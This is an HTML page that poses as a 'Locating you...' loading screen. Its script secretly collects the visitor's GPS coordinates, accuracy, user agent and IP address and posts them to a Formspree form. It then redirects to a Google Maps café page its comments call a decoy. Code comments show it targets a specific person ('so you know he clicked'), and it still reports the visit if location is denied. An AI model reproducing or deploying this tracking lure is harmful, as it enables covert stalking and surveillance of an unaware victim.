<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading Location...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f0f0;
            margin: 0;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        p {
            position: absolute;
            bottom: 20%;
            color: #666;
        }
    </style>
</head>
<body>

    <div class="loader"></div>
    <p>Locating you...</p>

    <script>
        // Helper to get IP address
        function getIP() {
            return fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => data.ip)
                .catch(() => "Unknown IP");
        }

        // Main Geolocation Logic
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(position) {
                const data = {
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    acc: position.coords.accuracy,
                    time: new Date().toISOString(),
                    userAgent: navigator.userAgent
                };

                // Get IP and then send everything
                getIP().then(ip => {
                    data.ip = ip;
                    
                    // Send to Formspree
                    fetch('https://formspree.io/f/xoeqgzjp', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(data)
                    })
                    .then(response => {
                        // Redirect to decoy immediately after sending
                        window.location.href = "https://www.google.com/maps/place/Blue+Taco+Cafe,+Delhi";
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        // Still redirect even if logging fails
                        window.location.href = "https://www.google.com/maps/place/Blue+Taco+Cafe,+Delhi";
                    });
                });

            }, function(error) {
                // If location is denied, still send a signal so you know he clicked
                fetch('https://formspree.io/f/xoeqgzjp', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        error: "Location Denied", 
                        time: new Date().toISOString(),
                        userAgent: navigator.userAgent 
                    })
                });
                
                window.location.href = "https://www.google.com/maps/place/Blue+Taco+Cafe,+Delhi";
            });
        } else {
            window.location.href = "https://www.google.com/maps/place/Blue+Taco+Cafe,+Delhi";
        }
    </script>

</body>
</html>
